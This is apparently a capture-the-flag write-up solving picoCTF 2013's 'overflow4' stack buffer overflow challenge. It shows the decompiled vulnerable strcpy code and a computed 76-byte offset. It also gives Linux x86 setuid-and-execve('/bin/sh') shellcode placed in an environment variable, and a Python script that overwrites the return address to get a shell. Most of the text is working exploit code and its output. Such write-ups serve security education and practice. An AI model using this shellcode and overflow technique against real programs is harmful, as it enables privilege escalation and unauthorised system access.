### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb

then i use IDA to analysis the code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  __uid_t v4; // ST1C_4@3

  if ( argc == 2 )
  {
    v4 = geteuid();
    setresuid(v4, v4, v4);
    vuln((char *)argv[1]);
    result = 0;
  }
  else
  {
    puts("Usage: buffer_overflow_shellcode [str]");
    result = 1;
  }
  return result;
}
```

the vuln() function
```c
int __cdecl vuln(char *src)
{
  char dest; // [sp+10h] [bp-48h]@1					//<------- overflow dest to modify return address

  strcpy(&dest, src);
  return dump_stack(&dest, 21, &src);
}
```

find the offset between dest and return
```
-00000048 dest            db ?
+00000004  r              db 4 dup(?)
```

offset = 0x48(dest) + 0x4(return) =0x4c = 76
but where we redirect the program!! 
the answer is shellcode !!

try to download the shellcode here :http://shell-storm.org/shellcode/files/shellcode-549.php
we try to use environtment variable to write the shellcode int

```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68
\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```

use the function getenv to get address of shellcode http://pastebin.com/LZM64WGL
```
./getenv hayicle ./overflow4
hayicle will be at 0xff95a8b0
```

the python script to change v3 become 1 look like
```python
padding ="A"*76
padding +="\xb0\xa8\x95\xff"
print padding
```

try run it
```
./overflow4 $(python overflow4.py)
Stack dump:
0xffffd620: 0xffffd800 (first argument)
0xffffd61c: 0xffffd8b0 (saved eip)
0xffffd618: 0x41414141 (saved ebp)
0xffffd614: 0x41414141
0xffffd610: 0x41414141
0xffffd60c: 0x41414141
0xffffd608: 0x41414141
0xffffd604: 0x41414141
0xffffd600: 0x41414141
0xffffd5fc: 0x41414141
0xffffd5f8: 0x41414141
0xffffd5f4: 0x41414141
0xffffd5f0: 0x41414141
0xffffd5ec: 0x41414141
0xffffd5e8: 0x41414141
0xffffd5e4: 0x41414141
0xffffd5e0: 0x41414141
0xffffd5dc: 0x41414141
0xffffd5d8: 0x41414141
0xffffd5d4: 0x41414141
0xffffd5d0: 0x41414141 (beginning of buffer)
$ whoami
hayicle
$ 
```

Well done!!